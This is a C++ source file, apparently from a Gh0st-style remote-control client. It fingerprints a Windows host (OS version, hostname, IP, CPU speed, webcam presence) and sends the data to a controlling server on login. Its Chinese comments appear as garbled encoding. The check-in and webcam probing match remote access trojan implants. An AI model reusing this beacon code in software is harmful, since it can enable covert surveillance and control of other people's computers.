#include "StdAfx.h"
#include "LoginServer.h"
#include "Common.h"
#include <string>

/************************************************************************
--------------------- 
���ߣ�IT1995 
��Դ��CSDN 
ԭ�ģ�https://blog.csdn.net/qq78442761/article/details/64440535 
��Ȩ����������Ϊ����ԭ�����£�ת���븽�ϲ������ӣ�
�޸�˵����2019.3.29��Ԭ�����޸�
************************************************************************/
std::string getSystemName()
{
	std::string vname("δ֪����ϵͳ");
	//���ж��Ƿ�Ϊwin8.1��win10
	typedef void(__stdcall*NTPROC)(DWORD*, DWORD*, DWORD*);
	HINSTANCE hinst = LoadLibrary("ntdll.dll");
	DWORD dwMajor, dwMinor, dwBuildNumber;
	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers"); 
	proc(&dwMajor, &dwMinor, &dwBuildNumber); 
	if (dwMajor == 6 && dwMinor == 3)	//win 8.1
	{
		vname = "Windows 8.1";
		printf_s("�˵��Եİ汾Ϊ:%s\n", vname.c_str());
		return vname;
	}
	if (dwMajor == 10 && dwMinor == 0)	//win 10
	{
		vname = "Windows 10";
		printf_s("�˵��Եİ汾Ϊ:%s\n", vname.c_str());
		return vname;
	}
	//���治���ж�Win Server����Ϊ���˻�δ������ϵͳ�Ļ��ӣ���ʱ������

	//�ж�win8.1���µİ汾
	SYSTEM_INFO info;                //��SYSTEM_INFO�ṹ�ж�64λAMD������
	GetSystemInfo(&info);            //����GetSystemInfo�������ṹ
	OSVERSIONINFOEX os;
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if (GetVersionEx((OSVERSIONINFO *)&os))
	{
		//������ݰ汾��Ϣ�жϲ���ϵͳ����
		switch (os.dwMajorVersion)
		{                    //�ж����汾��
		case 4:
			switch (os.dwMinorVersion)
			{                //�жϴΰ汾��
			case 0:
				if (os.dwPlatformId == VER_PLATFORM_WIN32_NT)
					vname ="Windows NT 4.0";  //1996��7�·���
				else if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
					vname = "Windows 95";
				break;
			case 10:
				vname ="Windows 98";
				break;
			case 90:
				vname = "Windows Me";
				break;
			}
			break;
		case 5:
			switch (os.dwMinorVersion)
			{               //�ٱȽ�dwMinorVersion��ֵ
			case 0:
				vname = "Windows 2000";    //1999��12�·���
				break;
			case 1:
				vname = "Windows XP";      //2001��8�·���
				break;
			case 2:
				if (os.wProductType == VER_NT_WORKSTATION &&
					info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
					vname = "Windows XP Professional x64 Edition";
				else if (GetSystemMetrics(SM_SERVERR2) == 0)
					vname = "Windows Server 2003";   //2003��3�·���
				else if (GetSystemMetrics(SM_SERVERR2) != 0)
					vname = "Windows Server 2003 R2";
				break;
			}
			break;
		case 6:
			switch (os.dwMinorVersion)
			{
			case 0:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows Vista";
				else
					vname = "Windows Server 2008";   //�������汾
				break;
			case 1:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows 7";
				else
					vname = "Windows Server 2008 R2";
				break;
			case 2:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows 8";
				else
					vname = "Windows Server 2012";
				break;
			}
			break;
		default:
			vname = "δ֪����ϵͳ";
		}
		printf_s("�˵��Եİ汾Ϊ:%s\n", vname.c_str());
	}
	else
		printf_s("�汾��ȡʧ��\n");
	return vname;
}


int SendLoginInfo(IOCPClient* ClientObject,DWORD dwSpeed)
{
	LOGIN_INFOR  LoginInfor = {0};
	LoginInfor.bToken = TOKEN_LOGIN; // ����Ϊ��¼
	//��ò���ϵͳ��Ϣ
	strcpy_s(LoginInfor.OsVerInfoEx, getSystemName().c_str());

	//���PCName
	char szPCName[MAX_PATH] = {0};
	gethostname(szPCName, MAX_PATH);  

	//���ClientIP
	sockaddr_in  ClientAddr;
	memset(&ClientAddr, 0, sizeof(ClientAddr));
	int iLen = sizeof(sockaddr_in);
	getsockname(ClientObject->m_sClientSocket, (SOCKADDR*)&ClientAddr, &iLen);

	DWORD	dwCPUMHz;
	dwCPUMHz = CPUClockMHz();

	BOOL bWebCamIsExist = WebCamIsExist();

	memcpy(LoginInfor.szPCName,szPCName,MAX_PATH);
	LoginInfor.dwSpeed  = dwSpeed;
	LoginInfor.dwCPUMHz = dwCPUMHz;
	LoginInfor.ClientAddr = ClientAddr.sin_addr;
	LoginInfor.bWebCamIsExist = bWebCamIsExist;

	int iRet = ClientObject->OnServerSending((char*)&LoginInfor, sizeof(LOGIN_INFOR));   

	return iRet;
}


DWORD CPUClockMHz()
{
	HKEY	hKey;
	DWORD	dwCPUMHz;
	DWORD	dwReturn = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, 
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMHz, &dwReturn);
	RegCloseKey(hKey);
	return	dwCPUMHz;
}

BOOL WebCamIsExist()
{
	BOOL	bOk = FALSE;

	char	szDeviceName[100], szVer[50];
	for (int i = 0; i < 10 && !bOk; ++i)
	{
		bOk = capGetDriverDescription(i, szDeviceName, sizeof(szDeviceName),     
			//ϵͳ��API����
			szVer, sizeof(szVer));
	}
	return bOk;
}
